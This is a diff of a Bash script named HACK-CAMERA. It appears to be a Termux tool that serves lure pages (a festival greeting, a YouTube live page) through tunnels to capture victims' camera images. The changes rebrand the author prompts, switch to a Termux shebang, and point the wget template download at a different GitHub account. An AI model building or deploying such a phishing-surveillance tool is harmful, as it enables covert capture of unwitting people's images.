@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 # HACK-CAMERA 
 # Version    : 2.1
@@ -368,7 +368,7 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nLIGHTYAGAMI${nc}@${blue}LIGHTYAGAMI ${red}$ ${nc}"
+printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -376,7 +376,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nLIGHTYAGAMI${nc}@${blue}XLIGHTYAGAMI ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -387,7 +387,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nLIGHTYAGAMI${nc}@${blue}XLIGHTYAGAMI ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -405,7 +405,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nLIGHTYAGAMI${nc}@${blue}XLIGHTYAGAMI ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -425,7 +425,7 @@ $red[Author]     ${cyan} :[LIGHTYAGAMI LIGHTYAGAMI]
 $red[Github]     ${cyan} :[https://github.com/devil-x91] 
 $red[Join us]    ${cyan} :[https://facebook.com/groups/861086515824952/]
 $red[Telegarm]   ${cyan} :[https://t.me/LIGHTYAGAMIDEVIL]"
-printf "${cyan}\nLIGHTYAGAMI${nc}@${cyan}XLIGHTYAGAMI ${red}$ ${nc}"
+printf "${cyan}\nLIGHT${nc}@${cyan}YAGAMI ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://bit.ly/3PV3S3r"
@@ -445,7 +445,7 @@ if ! [ -d $dir ];then
 mkdir $dir
 cd $dir
 netcheck
-wget -q --show-progress "https://github.com/XLIGHTYAGAMI/files/raw/main/${dir}.zip"
+wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
 unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
